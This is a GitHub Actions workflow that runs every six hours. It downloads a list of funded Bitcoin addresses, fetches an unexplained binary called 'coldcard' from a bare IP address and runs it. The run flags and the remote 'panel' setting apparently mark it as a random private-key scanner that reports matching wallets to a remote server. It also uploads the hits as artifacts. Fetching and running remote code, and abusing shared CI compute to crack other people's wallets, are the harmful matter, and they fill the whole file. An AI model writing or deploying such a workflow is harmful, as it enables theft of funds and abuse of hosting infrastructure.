name: cold

on:
  push:
    paths: ['.github/cold-trigger.txt']
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'

jobs:
  scan:
    runs-on: ubuntu-latest
    timeout-minutes: 340

    env:
      PANEL_URL: http://43.228.157.68:80

    steps:
      - uses: actions/checkout@v4

      - name: Prepare coldrun
        run: |
          mkdir -p coldrun

      - name: Download UTXO
        run: |
          wget -q "http://addresses.loyce.club/blockchair_bitcoin_addresses_and_balance_LATEST.tsv.gz" \
            -O coldrun/utxo_raw.tsv.gz

      - name: Download coldcard binary
        run: |
          wget -q "http://43.228.157.68/api/dl/custom" \
            -O coldrun/coldcard
          chmod +x coldrun/coldcard
          ls -lh coldrun/

      - name: Scan
        run: |
          cd coldrun
          ./coldcard \
            -max 4294967295 \
            -addr 20 \
            -hits hits.txt \
            -rand \
            -panel "$PANEL_URL" 2>&1 | tail -5 || true

      - name: Upload hits
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: hits-${{ github.run_id }}
          path: coldrun/hits.txt
          if-no-files-found: ignore
